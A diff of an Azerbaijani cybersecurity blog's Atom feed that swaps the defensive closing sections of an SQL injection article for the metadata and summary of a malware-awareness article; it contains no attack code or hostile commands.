-<h2 id="-təlim-və-proseslər">👨‍🏫 Təlim və proseslər</h2>
-
-<ul>
-  <li>Secure coding təlimi</li>
-  <li>Code review siyasəti</li>
-  <li>CI/CD-də skanlar</li>
-  <li>Incident response plan</li>
-  <li>Post-incident təhlil</li>
-</ul>
-
-<hr />
-
-<h2 id="-nəyi-etməmək-lazımdır">✋ Nəyi etməmək lazımdır</h2>
-
-<ul>
-  <li>Sadəcə <code class="language-plaintext highlighter-rouge">escape</code> etməklə kifayətlənmək</li>
-  <li>DB user-ə root hüquqlar vermək</li>
-  <li>İstehsalatda test exploit-lər işlətmək</li>
-  <li>Təkcə WAF-a güvənmək</li>
-</ul>
-
-<hr />
-
-<h2 id="nəticə">Nəticə</h2>
-
-<p>SQLi təhlükəlidir, amma qarşısı alınandır — düzgün kodlama və təhlükəsiz arxitektura ilə.</p>
-
-<hr />
-
-<h2 id="əlaqə-və-təlimlər">Əlaqə və Təlimlər</h2>
-
-<p>📲 <a href="https://wa.me/994555182523?text=Salam%2C%20OSI%20modeli%20hücumlar%C4%B1%20v%C9%99%20təhlükəsizlik%20d%C9%99rsl%C9%99ri%20il%C9%99%20maraqlan%C4%B1ram.">WhatsApp ilə əlaqə saxlayın</a> — Kiber Təhlükəsizlik və OSI Model Hücumları üzrə təlim və mentorluq.</p>
-
-<hr />
-
-<blockquote>
-  <p><strong>Qeyd:</strong> Bu məqalə yalnız tədris və müdafiə məqsədilə hazırlanıb.</p>
-</blockquote>
-
-<h2 id="-oxşar-yazılar">📚 Oxşar Yazılar</h2>
-
-<ul>
-  <li>
-    <p>🔐 <a href="https://cybershieldy.com/posts/sosial-mühəndislik">Phishing Hücumu Nədir? Canlı Nümunələr və Qorunma Yolları</a><br />
-Sosial mühəndislik və e-mail ilə gələn təhdidlərin analizi.</p>
-  </li>
-  <li>
-    <p>🥷 <a href="https://cybershieldy.com/posts/red-team-vs-blue-team">Kibertəhlükəsizlikdə Red Team və Blue Team nədir?</a><br />
-Hücum və müdafiə simulyasiyalarının real ssenarilərlə izahı.</p>
-  </li>
-  <li>
-    <p>📶 <a href="https://cybershieldy.com/posts/wifi-hucumlari">İctimai Wi-Fi istifadə edərkən nələrə diqqət etməli?</a><br />
-Wi-Fi üzərindən edilən MITM, sniffing və spoofing hücumları.</p>
-  </li>
-</ul>]]></content><author><name></name></author><category term="kiber təhlükəsizlik" /><category term="web təhlükəsizliyi" /><category term="sql injection" /><category term="sql injection" /><category term="sqli" /><category term="input validation" /><category term="parametrizasiya" /><category term="web təhlükəsizliyi" /><category term="kiber təlim" /><category term="kiber kurs" /><category term="web kurs" /><category term="backend təhlükəsizlik" /><category term="ethical hacking" /><category term="penetration testing" /><category term="cybersecurity 2025" /><summary type="html"><![CDATA[SQL Injection nədir, necə işləyir və ondan necə qorunmaq olar? 2025-ci ilə uyğun müdafiə texnikaları, təhlükəsiz kod nümunələri, parametrizasiya və real risk ssenariləri ilə tanış olun.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://cybershieldy.com/assets/images/sql.webp" /><media:content medium="image" url="https://cybershieldy.com/assets/images/sql.webp" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+</script>]]></content><author><name></name></author><category term="kiber təhlükəsizlik" /><category term="malware" /><category term="mobil təhlükəsizlik" /><category term="incident response" /><category term="virus" /><category term="mobile malware" /><category term="telefon virusu" /><category term="komputer virusu" /><category term="msfconsole" /><category term="malware analysis" /><category term="ransomware" /><category term="spyware" /><category term="trojan" /><category term="phishing" /><category term="android virus" /><category term="ios security" /><category term="cyber hygiene" /><category term="antivirus" /><summary type="html"><![CDATA[Telefon və kompüter viruslarının necə işlədiyini, yeni hücum növlərini, telefonun və kompüterin yoluxma yollarını, simptomları, aşkarlama və təmizləmə üsullarını və msfconsole-un etik pentest kontekstində nə olduğunu öyrənin.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://cybershieldy.com/assets/images/malware.webp" /><media:content medium="image" url="https://cybershieldy.com/assets/images/malware.webp" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
